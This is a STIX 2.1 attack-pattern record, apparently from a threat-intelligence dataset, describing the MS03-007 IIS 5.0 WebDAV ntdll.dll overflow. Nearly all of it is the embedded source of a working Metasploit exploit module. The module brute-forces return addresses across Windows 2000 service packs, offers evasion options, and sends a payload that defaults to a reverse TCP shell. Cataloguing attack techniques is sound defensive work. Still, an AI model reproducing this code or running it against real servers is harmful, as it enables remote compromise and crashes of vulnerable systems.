{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1aada275-55b0-4f87-9dd0-9fb008460cc8",
    "created": "2024-08-14T16:48:33.493057Z",
    "modified": "2024-08-14T16:48:33.493061Z",
    "name": "MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow",
    "description": " This exploits a buffer overflow in NTDLL.dll on Windows 2000 through the SEARCH WebDAV method in IIS. This particular module only works against Windows 2000. It should have a reasonable chance of success against SP0 to SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/iis/ms03_007_ntdll_webdav.rb",
            "external_id": "ms03_007_ntdll_webdav.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0109"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow',\n        'Description' => %q{\n          This exploits a buffer overflow in NTDLL.dll on Windows 2000\n          through the SEARCH WebDAV method in IIS. This particular\n          module only works against Windows 2000. It should have a\n          reasonable chance of success against SP0 to SP3.\n        },\n        'Author' => [ 'hdm' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2003-0109'],\n          ['OSVDB', '4467'],\n          ['BID', '7116'],\n          ['PACKETSTORM', '30939'],\n          ['MSB', 'MS03-007']\n        ],\n        'Privileged' => false,\n        'Payload' => {\n          'Space' => 512,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500\n        },\n        'Platform' => 'win',\n        'Arch' => [ARCH_X86],\n        'Targets' => [\n          [ 'Automatic Brute Force', {} ],\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/shell/reverse_tcp'\n        },\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2003-05-30',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_evasion_options(\n      [\n        # XXX: We don't have a style for module-local evasion settings yet, so use Advanced's formatting\n        OptBool.new('InvalidSearchRequest', [false, 'Replace the valid XML search with random data', false]),\n\n        # XXX - ugh, there has to be a better way to remove entries from an\n        # enum that overwriting the evalable enum option\n        OptEnum.new('HTTP::uri_encode', [false, 'Enable URI encoding', 'none', ['none', 'hex-normal'], 'none'])\n      ], self.class\n    )\n\n    deregister_options('HTTP::junk_params', 'HTTP::header_folding')\n  end\n\n  def autofilter\n    # Common vulnerability scanning tools report port 445/139\n    # due to how they test for the vulnerability. Remap this\n    # back to 80 for automated exploitation\n\n    rport = datastore['RPORT'].to_i\n    if (rport == 139 || rport == 445)\n      datastore['RPORT'] = 80\n    end\n\n    true\n  end\n\n  def check\n    # Verify the service is running first\n    res = send_request_raw({ 'uri' => '/' }, 5)\n    return CheckCode::Safe('Connection failed') unless res\n\n    xml = \"<?xml version=\\\"1.0\\\"?>\\r\\n\"\n    xml << \"<g:searchrequest xmlns:g=\\\"DAV:\\\">\\r\\n\"\n    xml << \"<g:sql>\\r\\n\"\n    xml << \"Select \\\"DAV:displayname\\\" from scope()\\r\\n\"\n    xml << \"</g:sql>\\r\\n\"\n    xml << \"</g:searchrequest>\\r\\n\"\n\n    response = send_request_cgi({\n      'uri' => \"/#{'x' * 65535}\",\n      'ctype' => 'text/xml',\n      'method' => 'SEARCH',\n      'data' => xml\n    }, 5)\n\n    if response && response.body.to_s.include?('Server Error(exception')\n      return CheckCode::Vulnerable(\"We've hit a server error (exception)\")\n    end\n\n    # Request-URI Too Long\n    if response && response.code == 414\n      return CheckCode::Safe(\"The server returned #{response.code} (#{response.message})\")\n    end\n\n    # Did the server stop accepting requests?\n    begin\n      send_request_raw({ 'uri' => '/' }, 5)\n    rescue StandardError\n      return CheckCode::Appears('The server stopped accepting requests') unless res\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    # Verify the service is running first\n    res = send_request_raw({ 'uri' => '/' }, 5)\n    fail_with(Failure::Unreachable, 'Connection failed') unless res\n\n    # Common offsets\n    common_offsets = [\n      \"\\x4f\\x4e\", # Windows 2000 Server / Professional (SP3 Universal(?) + some Server SP0/SP1/SP2)\n      \"\\x4f\\xce\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 ES / SP0 FR / SP0 HU / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x41\\xce\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 ES / SP0 FR / SP0 HU / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP1 SE / SP2 EN)\n      \"\\x41\\x43\", # Windows 2000 Server (SP1 EN / SP2 EN / SP2 RU)\n      \"\\x41\\xb4\", # Windows 2000 Professional (SP0 EN / SP0 NL / SP1 AR / SP1 EN / SP2 EN / SP2 FR / SP2 PT)\n      \"\\x41\\xb8\", # Windows 2000 Professional (SP0 EN / SP0 FI / SP0 NL / SP0 TR / SP1 CZ / SP2 FR / SP2 PT)\n    ]\n\n    # Generic Bruteforce - Windows 2000 Professional\n    pro_offsets = [\n      \"\\x41\\xa8\", # Windows 2000 Professional (SP0 EN / SP0 NL / SP1 EN / SP2 EN / SP2 FR / SP2 PT)\n      \"\\x41\\xa9\", # Windows 2000 Professional (SP0 EN / SP0 NL / SP1 AR / SP1 EN / SP2 EN / SP2 FR / SP2 PT)\n      \"\\x41\\xaa\", # Windows 2000 Professional (SP1 EN / SP2 FR / SP2 PT)\n      \"\\x41\\xab\", # Windows 2000 Professional (SP1 AR)\n      \"\\x41\\xac\", # Windows 2000 Professional (SP0 FI)\n      \"\\x41\\xad\", # Windows 2000 Professional (SP0 FI / SP0 TR / SP1 CZ)\n      \"\\x41\\xae\", # Windows 2000 Professional (SP0 FI / SP0 TR / SP1 CZ)\n      \"\\x41\\xaf\",\n\n      \"\\x41\\xb0\",\n      \"\\x41\\xb1\", # Windows 2000 Professional (SP0 EN)\n      \"\\x41\\xb2\", # Windows 2000 Professional (SP0 EN / SP0 NL / SP1 EN / SP2 EN / SP2 PT)\n      \"\\x41\\xb3\", # Windows 2000 Professional (SP0 EN / SP0 NL / SP1 AR / SP1 EN / SP2 FR / SP2 PT)\n      \"\\x41\\xb4\", # Windows 2000 Professional (SP0 EN / SP0 NL / SP1 AR / SP1 EN / SP2 EN / SP2 FR / SP2 PT)\n      \"\\x41\\xb5\", # Windows 2000 Professional (SP0 EN / SP0 NL / SP1 AR / SP2 EN / SP2 FR / SP2 PT)\n      \"\\x41\\xb6\", # Windows 2000 Professional (SP0 NL / SP1 AR / SP2 FR / SP2 PT)\n      \"\\x41\\xb7\", # Windows 2000 Professional (SP0 EN / SP0 FI / SP0 TR / SP1 AR / SP1 CZ / SP2 FR)\n      \"\\x41\\xb8\", # Windows 2000 Professional (SP0 EN / SP0 FI / SP0 NL / SP0 TR / SP1 CZ / SP2 FR / SP2 PT)\n      \"\\x41\\xb9\", # Windows 2000 Professional (SP0 FI / SP0 NL / SP0 TR / SP1 AR / SP2 FR / SP2 PT)\n      \"\\x41\\xba\", # Windows 2000 Professional (SP0 EN / SP0 FI / SP0 TR / SP2 FR)\n      \"\\x41\\xbb\", # Windows 2000 Professional (SP0 FI / SP0 NL / SP0 TR / SP1 CZ / SP2 PT)\n      \"\\x41\\xbc\", # Windows 2000 Professional (SP0 FI / SP1 AR / SP2 FR)\n      \"\\x41\\xbd\", # Windows 2000 Professional (SP0 FI / SP0 TR)\n      \"\\x41\\xbe\", # Windows 2000 Professional (SP0 TR)\n      \"\\x41\\xbf\", # Windows 2000 Professional (SP0 FI)\n    ]\n\n    # Generic Bruteforce - Windows 2000 Server\n    server_offsets = [\n      \"\\x4f\\xc0\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT)\n      \"\\x4f\\xc1\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x4f\\xc2\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x4f\\xc3\", # Windows 2000 Server (SP1 EN / SP2 EN)\n      \"\\x4f\\xc4\", # Windows 2000 Server (SP2 EN)\n      \"\\x4f\\xc5\", # Windows 2000 Server (SP0 ES / SP0 TR)\n      \"\\x4f\\xc6\", # Windows 2000 Server (SP0 ES / SP0 TR / SP1 SE)\n      \"\\x4f\\xc7\", # Windows 2000 Server (SP0 ES / SP0 HU / SP0 TR / SP1 SE)\n      \"\\x4f\\xc8\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 SE)\n      \"\\x4f\\xc9\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x4f\\xca\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x4f\\xcb\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP0 TR / SP1 EN / SP2 EN)\n      \"\\x4f\\xcc\", # Windows 2000 Server (SP0 DE / SP1 EN / SP2 EN)\n      \"\\x4f\\xcd\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 ES / SP0 FR / SP0 HU / SP0 IT / SP0 NL / SP0 PT / SP0 TR)\n      \"\\x4f\\xce\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 ES / SP0 FR / SP0 HU / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x4f\\xcf\", # Windows 2000 Server (SP0 ES / SP0 TR / SP1 EN / SP2 EN)\n\n      \"\\x4f\\x40\",\n      \"\\x4f\\x41\",\n      \"\\x4f\\x42\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT)\n      \"\\x4f\\x43\", # Windows 2000 Server (SP1 EN / SP2 EN / SP2 RU)\n      \"\\x4f\\x44\",\n      \"\\x4f\\x45\",\n      \"\\x4f\\x46\",\n      \"\\x4f\\x47\", # Windows 2000 Server (SP0 ES / SP0 HU / SP0 TR)\n      \"\\x4f\\x48\",\n      \"\\x4f\\x49\",\n      \"\\x4f\\x4a\",\n      \"\\x4f\\x4b\",\n      \"\\x4f\\x4c\",\n      \"\\x4f\\x4d\",\n      \"\\x4f\\x4e\", # Windows 2000 Server / Professional (SP3 Universal(?) + some Server SP0/SP1/SP2)\n      \"\\x4f\\x4f\",\n\n      \"\\x41\\x40\",\n      \"\\x41\\x41\",\n      \"\\x41\\x42\", # Windows 2000 Server (SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT)\n      \"\\x41\\x43\", # Windows 2000 Server (SP1 EN / SP2 EN / SP2 RU)\n      \"\\x41\\x44\",\n      \"\\x41\\x45\",\n      \"\\x41\\x46\",\n      \"\\x41\\x47\", # Windows 2000 Server (SP0 ES / SP0 HU)\n      \"\\x41\\x48\", # Windows 2000 Server (SP1 SE)\n      \"\\x41\\x49\",\n      \"\\x41\\x4a\",\n      \"\\x41\\x4b\",\n      \"\\x41\\x4c\",\n      \"\\x41\\x4d\",\n      \"\\x41\\x4e\",\n      \"\\x41\\x4f\",\n\n      \"\\x41\\xc0\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT)\n      \"\\x41\\xc1\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x41\\xc2\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x41\\xc3\", # Windows 2000 Server (SP1 EN / SP2 EN)\n      \"\\x41\\xc4\", # Windows 2000 Server (SP2 EN)\n      \"\\x41\\xc5\", # Windows 2000 Server (SP0 ES / SP0 TR)\n      \"\\x41\\xc6\", # Windows 2000 Server (SP0 ES / SP0 TR / SP1 SE)\n      \"\\x41\\xc7\", # Windows 2000 Server (SP0 ES / SP0 HU / SP0 TR / SP1 SE)\n      \"\\x41\\xc8\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 SE)\n      \"\\x41\\xc9\", # Windows 2000 Server (SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x41\\xca\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x41\\xcb\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 FR / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP2 EN)\n      \"\\x41\\xcc\", # Windows 2000 Server (SP0 DE / SP1 EN / SP2 EN)\n      \"\\x41\\xcd\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 ES / SP0 FR / SP0 IT / SP0 HU / SP0 NL / SP0 PT / SP0 TR)\n      \"\\x41\\xce\", # Windows 2000 Server (SP0 DE / SP0 EN / SP0 ES / SP0 FR / SP0 HU / SP0 IT / SP0 NL / SP0 PT / SP1 EN / SP1 SE / SP2 EN)\n      \"\\x41\\xcf\", # Windows 2000 Server (SP0 DE / SP0 ES / SP0 NL / SP0 TR / SP1 EN / SP1 SE / SP2 EN)\n    ]\n\n    if datastore['InvalidSearchRequest']\n      xml = rand_text(32..1056)\n    else\n      xml = \"<?xml version=\\\"1.0\\\"?>\\r\\n\"\n      xml << \"<g:searchrequest xmlns:g=\\\"DAV:\\\">\\r\\n\"\n      xml << \"<g:sql>\\r\\n\"\n      xml << \"Select \\\"DAV:displayname\\\" from scope()\\r\\n\"\n      xml << \"</g:sql>\\r\\n\"\n      xml << \"</g:searchrequest>\\r\\n\"\n    end\n\n    # The nop generator can be cpu-intensive for large buffers, so we use a static sled of 'A'\n    # This decodes to \"inc ecx\"\n    url = 'A' * (65_516 - payload.encoded.length)\n    url << payload.encoded\n\n    offsets = common_offsets.concat(server_offsets).concat(pro_offsets).uniq\n\n    offsets.each_with_index do |ret, index|\n      print_status(\"Trying return address #{format('0x%.8x', Rex::Text.to_unicode(ret).unpack('V*').first)} (#{index + 1} / #{offsets.length})...\")\n      url[283, 2] = ret\n\n      begin\n        send_request_cgi({\n          'uri' => \"/#{url}\",\n          'ctype' => 'text/xml',\n          'method' => 'SEARCH',\n          'data' => xml\n        }, 5)\n      rescue StandardError => e\n        print_error(\"Attempt failed: #{e}\")\n      end\n\n      1.upto(8) do |_i|\n        select(nil, nil, nil, 0.25)\n        break if session_created?\n      end\n\n      break if session_created?\n\n      fail_with(Failure::Unreachable, 'Giving up, IIS must have completely crashed') unless service_running?\n    end\n  end\n\n  # Try connecting to the server up to 20 times, with a two second gap\n  # This gives the server time to recover after a failed exploit attempt\n  def service_running?\n    print_status('Checking if IIS is back up after a failed attempt...')\n    1.upto(20) do |i|\n      break if session_created?\n\n      return true if send_request_raw({ 'uri' => '/' }, 5)\n\n      print_error(\"Connection failed (#{i} of 20)...\")\n      select(nil, nil, nil, 2)\n    end\n    false\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-05-30",
    "x_mitre_platforms": [
        "win'"
    ]
}